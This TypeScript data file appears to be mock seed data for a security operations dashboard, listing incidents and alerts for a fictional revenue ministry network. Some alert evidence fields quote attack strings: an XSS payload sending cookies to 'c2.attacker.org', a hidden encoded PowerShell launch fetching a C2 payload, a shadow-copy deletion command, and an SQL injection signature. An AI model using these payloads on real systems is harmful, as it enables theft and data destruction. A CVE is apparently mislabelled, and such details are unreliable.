    description: 'Primary DNS server mor-dns-pri01 logged over 4,100 high-entropy TXT lookups targeting subdomains of `ns1.cloud-metrics-sync.net`, characteristic of Iodine or dnscat2 command-and-control encapsulation.',
    relatedAlertIds: ['ALT-1011'],
    relatedEventIds: ['EVT-9015'],
    recommendedSteps: [
      'Sinkhole domain *.ns1.cloud-metrics-sync.net via Response Policy Zone (RPZ) on all internal resolvers',
      'Trace client IP initiating high-entropy DNS lookups to branch tax office workstation',
      'Quarantine infected workstation and collect forensic memory dump for C2 agent extraction',
      'Implement maximum DNS query length and entropy inspection thresholds on perimeter DNS forwarders'
    ],
    resolutionHistory: [
      {
        timestamp: '2026-10-15 07:48:22',
        action: 'High-Entropy Query Alert',
        performedBy: 'DNS Analytics Engine',
        details: 'Over 4,100 TXT records queried with entropy score 4.89.'
      },
      {
        timestamp: '2026-10-15 08:05:00',
        action: 'RPZ Sinkhole Configured',
        performedBy: 'Mekonnen Wolde',
        details: 'Domain sinkholed to 127.0.0.1; C2 communications silenced.'
      }
    ],
    timeline: [
      {
        id: 'TL-111-1',
        timestamp: '2026-10-15 07:48:22',
        user: 'DNS Analytics Engine',
        action: 'High entropy domain alert ALT-1011 generated incident',
        type: 'status_change'
      }
    ],
    notes: [
      {
        id: 'NOTE-111-1',
        author: 'Mekonnen Wolde',
        role: 'Auditor',
        timestamp: '2026-10-15 08:15:00',
        text: 'Source endpoint identified as a workstation in the Addis Ababa regional tax branch. Host quarantined by network team for scanning.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-111-1',
        actionName: 'Sinkhole Malicious Domain on Internal Resolvers',
        targetAsset: 'mor-dns-pri01.revenue.gov.et',
        initiatedBy: 'Mekonnen Wolde',
        timestamp: '2026-10-15 08:05:00',
        status: 'completed',
        resultDetails: 'Response policy zone (RPZ) updated; domain redirected to 127.0.0.1.'
      }
    ]
  },
  {
    id: 'INC-2026-0112',
    title: 'Configuration and Patch Management Risk: Exposed Management Port & Missing Patches',
    severity: 'medium',
    status: 'new',
    category: 'System',
    detectionTime: '2026-10-15 06:10:15',
    lastUpdated: '2026-10-15 07:45:10',
    affectedAssets: ['Web Application Server (mor-web-gateway.revenue.gov.et)'],
    assignedAnalyst: 'Endale Aychew',
    source: 'Configuration Auditor / Vulnerability Scanner',
    summary: 'Critical security configuration changes or exploitation attempts involving unpatched known vulnerabilities.',
    description: 'Security group rule change exposed administration port 9090 to 0.0.0.0/0 on the web gateway without change ticket approval, and Nessus scan confirmed unpatched OpenSSL remote code execution vulnerability (CVE-2024-38077).',
    relatedAlertIds: ['ALT-1013', 'ALT-1014', 'ALT-1015'],
    relatedEventIds: ['EVT-9016'],
    recommendedSteps: [
      'Revert unauthorized ingress security rule on port 9090 to restrict access to internal management bastion only',
      'Apply emergency vendor patch for OpenSSL vulnerability (CVE-2024-38077)',
      'Restart stopped log ingestion agent (rsyslog/filebeat) on web gateway server',
      'Audit configuration management logs to identify initiating account of unauthorized rule change'
    ],
    resolutionHistory: [
      {
        timestamp: '2026-10-15 06:10:15',
        action: 'Configuration Risk Correlated',
        performedBy: 'Compliance Engine',
        details: 'Multiple configuration drift alerts ALT-1013, ALT-1014, and ALT-1015 combined.'
      },
      {
        timestamp: '2026-10-15 06:25:00',
        action: 'Ingress Port Closed',
        performedBy: 'Endale Aychew',
        details: 'Port 9090 removed from public ingress; restricted to bastion jump host.'
      }
    ],
    timeline: [
      {
        id: 'TL-112-1',
        timestamp: '2026-10-15 06:10:15',
        user: 'Compliance Engine',
        action: 'Elevated alerts ALT-1013, ALT-1014, ALT-1015 into unified configuration risk case',
        type: 'status_change'
      }
    ],
    notes: [
      {
        id: 'NOTE-112-1',
        author: 'Endale Aychew',
        role: 'Security Administrator',
        timestamp: '2026-10-15 06:40:00',
        text: 'Revoked the unauthorized ingress rule immediately and scheduled emergency patch maintenance window for 21:00 EAT.'
      }
    ],
    responseActions: [
      {
        id: 'ACT-112-1',
        actionName: 'Revert Ingress Security Group to Hardened Baseline',
        targetAsset: 'mor-web-gateway.revenue.gov.et',
        initiatedBy: 'Endale Aychew',
        timestamp: '2026-10-15 06:25:00',
        status: 'completed',
        resultDetails: 'Port 9090 closed to public; restricted to internal bastion jump host.'
      }
    ]
  }
];

export const INITIAL_ALERTS: Alert[] = [
  {
    id: 'ALT-1001',
    title: 'Multiple Failed Administrator Login Attempts',
    detectionRuleId: 'RULE-AUTH-01',
    detectionRuleName: 'Brute-Force & Password Spray Detection against Administrative Accounts',
    severity: 'critical',
    firstDetected: '2026-10-15 06:45:12',
    lastDetected: '2026-10-15 06:54:30',
    detectionTimestamp: '2026-10-15 06:54:30',
    sourceSystem: 'Active Directory Domain Controller',
    affectedAsset: 'Active Directory Domain Controller (mor-dc-ad01.revenue.gov.et)',
    sourceIp: '197.156.78.44',
    relatedIncidentId: 'INC-2026-0104',
    status: 'linked',
    assignedTo: 'Endale Aychew',
    eventCount: 142,
    evidence: [
      { label: 'Target Account', value: 'adm_tgirmai (Domain Admin)' },
      { label: 'Failure Code', value: '0xC000006A (Bad Password)' },
      { label: 'Logon Type', value: '3 (Network Logon / Kerberos)' },
      { label: 'Source Subnet', value: '197.156.78.0/24 (External Proxy Range)' }
    ]
  },
  {
    id: 'ALT-1002',
    title: 'Successful Login Following Repeated Authentication Failures',
    detectionRuleId: 'RULE-AUTH-02',
    detectionRuleName: 'Privilege Account Compromise: Success After Failure Cluster',
    severity: 'critical',
    firstDetected: '2026-10-15 06:55:00',
    lastDetected: '2026-10-15 06:55:00',
    detectionTimestamp: '2026-10-15 06:55:00',
    sourceSystem: 'Active Directory Domain Controller',
    affectedAsset: 'Active Directory Domain Controller (mor-dc-ad01.revenue.gov.et)',
    sourceIp: '197.156.78.44',
    relatedIncidentId: 'INC-2026-0104',
    status: 'linked',
    assignedTo: 'Endale Aychew',
    eventCount: 1,
    evidence: [
      { label: 'Authenticated User', value: 'adm_tgirmai' },
      { label: 'Prior Failures (10m)', value: '142 consecutive failures' },
      { label: 'Workstation Name', value: 'KALI-EXTERNAL-01' },
      { label: 'Kerberos Ticket', value: 'TGT Granted (AES-256)' }
    ]
  },
  {
    id: 'ALT-1003',
    title: 'SQL Injection Pattern Detected in Web Server Logs',
    detectionRuleId: 'RULE-WEB-01',
    detectionRuleName: 'SQL Injection Signature Correlation (OWASP Top 10 - A03)',
    severity: 'critical',
    firstDetected: '2026-10-15 07:12:10',
    lastDetected: '2026-10-15 07:44:18',
    detectionTimestamp: '2026-10-15 07:44:18',
    sourceSystem: 'Taxpayer Portal',
    affectedAsset: 'Taxpayer Portal (mor-portal-app01.revenue.gov.et)',
    sourceIp: '45.134.20.89',
    relatedIncidentId: 'INC-2026-0102',
    status: 'linked',
    assignedTo: 'Endale Aychew',
    eventCount: 18450,
    evidence: [
      { label: 'URI Endpoint', value: '/portal/api/taxpayer-auth' },
      { label: 'HTTP Method', value: 'POST' },
      { label: 'Signature Match', value: 'UNION SELECT table_name, column_name FROM information_schema.tables' },
      { label: 'WAF Action', value: 'Blocked / 403 Forbidden' }
    ]
  },
  {
    id: 'ALT-1004',
    title: 'Possible Cross-Site Scripting Attempt Against a Tax Portal',
    detectionRuleId: 'RULE-WEB-02',
    detectionRuleName: 'Cross-Site Scripting (XSS) Reflected & Stored Filter',
    severity: 'high',
    firstDetected: '2026-10-15 07:18:00',
    lastDetected: '2026-10-15 07:35:10',
    detectionTimestamp: '2026-10-15 07:35:10',
    sourceSystem: 'Taxpayer Portal',
    affectedAsset: 'Taxpayer Portal (mor-portal-app01.revenue.gov.et)',
    sourceIp: '45.134.20.89',
    relatedIncidentId: 'INC-2026-0102',
    status: 'linked',
    assignedTo: 'Endale Aychew',
    eventCount: 320,
    evidence: [
      { label: 'Parameter', value: 'taxpayerBusinessName' },
      { label: 'Injected Payload', value: '<script>fetch("//c2.attacker.org/steal?cookie="+document.cookie)</script>' },
      { label: 'Sanitizer Trigger', value: 'Input sanitized and filtered before template render' }
    ]
  },
  {
    id: 'ALT-1005',
    title: 'Malware Detection Received from Endpoint Security',
    detectionRuleId: 'RULE-MAL-01',
    detectionRuleName: 'Known Malicious Binary / Trojanized Signature Detection',
    severity: 'critical',
    firstDetected: '2026-10-15 08:05:12',
    lastDetected: '2026-10-15 09:20:11',
    detectionTimestamp: '2026-10-15 09:20:11',
    sourceSystem: 'Employee Workstation',
    affectedAsset: 'Employee Workstation (mor-ws-fin-042.revenue.gov.et)',
    sourceIp: '10.120.40.108',
    relatedIncidentId: 'INC-2026-0103',
    status: 'investigating',
    assignedTo: 'Biks Biset',
    eventCount: 3,
    evidence: [
      { label: 'File Hash (SHA256)', value: 'a4b12c89f28d810243eec4110892d194881726a8947b19812401824701294812' },
      { label: 'Threat Classification', value: 'Trojan:Win32/LockBit.MOR!recon' },
      { label: 'File Path', value: 'C:\\Users\\Public\\Downloads\\Tax_Audits_Oct.exe' },
      { label: 'EDR Action', value: 'Quarantined and process killed' }
    ]
  },
  {
    id: 'ALT-1006',
    title: 'Suspicious PowerShell or Command Execution',
    detectionRuleId: 'RULE-EDR-03',
    detectionRuleName: 'Obfuscated PowerShell & Living-off-the-Land Binary (LOLBin) Execution',
    severity: 'high',
    firstDetected: '2026-10-15 08:08:22',
    lastDetected: '2026-10-15 08:12:45',
    detectionTimestamp: '2026-10-15 08:12:45',
    sourceSystem: 'Email Server',
    affectedAsset: 'Email Server (mor-mail-gw01.revenue.gov.et)',
    sourceIp: '10.120.8.25',
    relatedIncidentId: 'INC-2026-0109',
    status: 'linked',
    assignedTo: 'Biks Biset',
    eventCount: 6,
    evidence: [
      { label: 'Command Line', value: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...==' },
      { label: 'Parent Process', value: 'WINWORD.EXE (PID: 6412)' },
      { label: 'Decoded Target', value: 'http://c2-stage.tax-filing-support.net/payload.bin' }
    ]
  },
  {
    id: 'ALT-1007',
    title: 'Unexpected Administrator Privilege Assignment',
    detectionRuleId: 'RULE-SEC-04',
    detectionRuleName: 'Active Directory Privileged Security Group Membership Change',
    severity: 'high',
    firstDetected: '2026-10-15 07:02:18',
    lastDetected: '2026-10-15 07:02:18',
    detectionTimestamp: '2026-10-15 07:02:18',
    sourceSystem: 'Active Directory Domain Controller',
    affectedAsset: 'Active Directory Domain Controller (mor-dc-ad01.revenue.gov.et)',
    sourceIp: '10.120.5.10',
    relatedIncidentId: 'INC-2026-0104',
    status: 'linked',
    assignedTo: 'Endale Aychew',
    eventCount: 1,
    evidence: [
      { label: 'Target Group', value: 'Enterprise Admins (CN=Enterprise Admins,CN=Users)' },
      { label: 'Member Added', value: 'CN=temp_operator99' },
      { label: 'Modified By', value: 'adm_tgirmai' },
      { label: 'Event ID', value: '4728 (Member Added to Security Group)' }
    ]
  },
  {
    id: 'ALT-1008',
    title: 'Unusual Database Query Volume',
    detectionRuleId: 'RULE-DB-01',
    detectionRuleName: 'Abnormal Database Query Volume & Massive SELECT Spikes',
    severity: 'high',
    firstDetected: '2026-10-15 08:12:40',
    lastDetected: '2026-10-15 08:35:10',
    detectionTimestamp: '2026-10-15 08:35:10',
    sourceSystem: 'Tax Database Server',
    affectedAsset: 'Tax Database Server (mor-db-cluster01.revenue.gov.et)',
    sourceIp: '10.120.10.22',
    relatedIncidentId: 'INC-2026-0106',
    status: 'investigating',
    assignedTo: 'Biks Biset',
    eventCount: 4200,
    evidence: [
      { label: 'Target Schema', value: 'mor_core_tax.corporate_filings' },
      { label: 'Query Rate', value: '720 queries/sec (Normal: < 15/sec)' },
      { label: 'Database User', value: 'tax_readonly_rep' },
      { label: 'Executed Command', value: 'SELECT * FROM tax_assessments WHERE fiscal_year = 2026' }
    ]
  },
  {
    id: 'ALT-1009',
    title: 'Large Outbound Data Transfer from a Sensitive Server',
    detectionRuleId: 'RULE-NET-05',
    detectionRuleName: 'Data Exfiltration: High-Volume Egress from Core Data Stores',
    severity: 'critical',
    firstDetected: '2026-10-15 09:10:00',
    lastDetected: '2026-10-15 09:28:45',
    detectionTimestamp: '2026-10-15 09:28:45',
    sourceSystem: 'Tax Database Server',
    affectedAsset: 'Tax Database Server (mor-db-cluster01.revenue.gov.et)',
    sourceIp: '185.191.171.3',
    relatedIncidentId: 'INC-2026-0101',
    status: 'linked',
    assignedTo: 'Endale Aychew',
    eventCount: 148,
    evidence: [
      { label: 'Transferred Volume', value: '14.8 GB compressed archive' },
      { label: 'Destination Country', value: 'Seychelles (Unindexed Host)' },
      { label: 'Protocol', value: 'SFTP over port 8443' },
      { label: 'Policy Violation', value: 'Egress from PCI/Tax tier without approved change ticket' }
    ]
  },
  {
    id: 'ALT-1010',
    title: 'Ransomware-Like File Modification Behavior',
    detectionRuleId: 'RULE-RANSOM-01',
    detectionRuleName: 'Rapid Encryption Heuristics & Shadow Copy Tampering',
    severity: 'critical',
    firstDetected: '2026-10-15 09:14:02',
    lastDetected: '2026-10-15 09:20:11',
    detectionTimestamp: '2026-10-15 09:20:11',
    sourceSystem: 'Employee Workstation',
    affectedAsset: 'Employee Workstation (mor-ws-fin-042.revenue.gov.et)',
    sourceIp: '10.120.40.108',
    relatedIncidentId: 'INC-2026-0103',
    status: 'investigating',
    assignedTo: 'Biks Biset',
    eventCount: 890,
    evidence: [
      { label: 'Renamed Extensions', value: '.locked_mor (840 files within 60s)' },
      { label: 'Shadow Copy Command', value: 'vssadmin delete shadows /all /quiet' },
      { label: 'Ransom Note Dropped', value: 'HOW_TO_DECRYPT_FILES.txt in C:\\Users\\Public\\' }
    ]
  },
  {
    id: 'ALT-1011',
    title: 'Suspicious DNS Query Patterns',
    detectionRuleId: 'RULE-DNS-02',
    detectionRuleName: 'High-Entropy TXT Query & Covert Channel Exfiltration',
    severity: 'medium',
    firstDetected: '2026-10-15 07:48:22',
    lastDetected: '2026-10-15 08:30:10',
    detectionTimestamp: '2026-10-15 08:30:10',
    sourceSystem: 'DNS Server',
    affectedAsset: 'DNS Server (mor-dns-pri01.revenue.gov.et)',
    sourceIp: '10.120.5.2',
    relatedIncidentId: 'INC-2026-0111',
    status: 'acknowledged',
    assignedTo: 'Mekonnen Wolde',
    eventCount: 4120,
    evidence: [
      { label: 'Queried Domain', value: '*.ns1.cloud-metrics-sync.net' },
      { label: 'Entropy Score', value: '4.89 (High Randomness - Exfiltration Indicator)' },
      { label: 'Record Type', value: 'TXT (Length: 220 bytes)' }
    ]
  },
  {
    id: 'ALT-1012',
    title: 'Firewall Intrusion Prevention Alert',
    detectionRuleId: 'RULE-FW-01',
    detectionRuleName: 'Perimeter IPS: High-Volume Exploit & Flood Signature',
    severity: 'high',
    firstDetected: '2026-10-15 09:55:00',
    lastDetected: '2026-10-15 10:15:00',
    detectionTimestamp: '2026-10-15 10:15:00',
    sourceSystem: 'Firewall',
    affectedAsset: 'Firewall (mor-ngfw-edge01.revenue.gov.et)',
    sourceIp: '89.248.163.50',
    relatedIncidentId: 'INC-2026-0107',
    status: 'assigned',
    assignedTo: 'Mekonnen Wolde',
    eventCount: 65400,
    evidence: [
      { label: 'Attack Type', value: 'TCP SYN Flood & HTTP-POST Exhaustion' },
      { label: 'Target Port', value: 'TCP 443 (HTTPS Portal Ingress)' },
      { label: 'IPS Action', value: 'Drop Packet & Dynamic Blackhole' }
    ]
  },
  {
    id: 'ALT-1013',
    title: 'Critical Server Missing Security Updates',
    detectionRuleId: 'RULE-VULN-01',
    detectionRuleName: 'Vulnerability Assessment: CVSS 9.8 Remote Code Execution',
    severity: 'medium',
    firstDetected: '2026-10-15 06:10:15',
    lastDetected: '2026-10-15 06:10:15',
    detectionTimestamp: '2026-10-15 06:10:15',
    sourceSystem: 'Web Application Server',
    affectedAsset: 'Web Application Server (mor-web-gateway.revenue.gov.et)',
    sourceIp: '10.120.10.10',
    relatedIncidentId: 'INC-2026-0112',
    status: 'new',
    assignedTo: 'Endale Aychew',
    eventCount: 1,
    evidence: [
      { label: 'Vulnerability CVE', value: 'CVE-2024-38077 (CVSS 9.8)' },
      { label: 'Affected Package', value: 'OpenSSL 3.0.7-1ubuntu1' },
      { label: 'Remediation', value: 'Upgrade to OpenSSL >= 3.0.13' }
    ]
  },
  {
    id: 'ALT-1014',
    title: 'Unexpected Changes to Security Configuration',
    detectionRuleId: 'RULE-CFG-02',
    detectionRuleName: 'Security Group / Ingress Firewall Rule Tampering',
    severity: 'medium',
    firstDetected: '2026-10-15 06:12:00',
    lastDetected: '2026-10-15 06:12:00',
    detectionTimestamp: '2026-10-15 06:12:00',
    sourceSystem: 'Web Application Server',
    affectedAsset: 'Web Application Server (mor-web-gateway.revenue.gov.et)',
    sourceIp: '10.120.5.20',
    relatedIncidentId: 'INC-2026-0112',
    status: 'new',
    assignedTo: 'Endale Aychew',
    eventCount: 1,
    evidence: [
      { label: 'Modified Rule', value: 'Ingress TCP 9090 (Management Console)' },
      { label: 'Allowed CIDR', value: '0.0.0.0/0 (Global Public Access)' },
      { label: 'Initiating User', value: 'deploy_agent_sys' }
    ]
  },
  {
    id: 'ALT-1015',
    title: 'Log Collection Stopped on a Critical Server',
    detectionRuleId: 'RULE-LOG-01',
    detectionRuleName: 'SIEM Log Source Heartbeat & Agent Ingestion Failure',
    severity: 'medium',
    firstDetected: '2026-10-15 06:15:00',
    lastDetected: '2026-10-15 06:45:00',
    detectionTimestamp: '2026-10-15 06:45:00',
    sourceSystem: 'Web Application Server',
    affectedAsset: 'Web Application Server (mor-web-gateway.revenue.gov.et)',
    sourceIp: '10.120.10.10',
    relatedIncidentId: 'INC-2026-0112',
    status: 'new',
    assignedTo: 'Endale Aychew',
    eventCount: 1,
    evidence: [
      { label: 'Agent Service', value: 'rsyslog / filebeat' },
      { label: 'Status', value: 'Stopped / Process Inactive' },
      { label: 'Downtime Duration', value: '30 minutes without syslog heartbeat' }
    ]
  },
  {
    id: 'ALT-1016',
    title: 'Suspicious Access to Taxpayer Records',
    detectionRuleId: 'RULE-DLP-01',
    detectionRuleName: 'DLP Audit: Unauthorized Taxpayer PII & Asset Record Access',
    severity: 'high',
    firstDetected: '2026-10-15 08:42:15',
    lastDetected: '2026-10-15 09:50:35',
    detectionTimestamp: '2026-10-15 09:50:35',
    sourceSystem: 'Database Server',
    affectedAsset: 'Database Server (mor-taxdb-replica.revenue.gov.et)',
    sourceIp: '10.120.40.88',
    relatedIncidentId: 'INC-2026-0108',
    status: 'new',
    assignedTo: 'Bethlehem Haile',
    eventCount: 3400,
    evidence: [
      { label: 'Table Queried', value: 'taxpayer_confidential_audit_dossiers' },
      { label: 'Accessed Accounts', value: '3,400 Commercial Importers & Exporters' },
      { label: 'Accessing User', value: 'k_mengistu (Customs Officer)' },
      { label: 'Jurisdiction Check', value: 'Access outside assigned Addis Ababa customs zone' }
    ]
  }
];
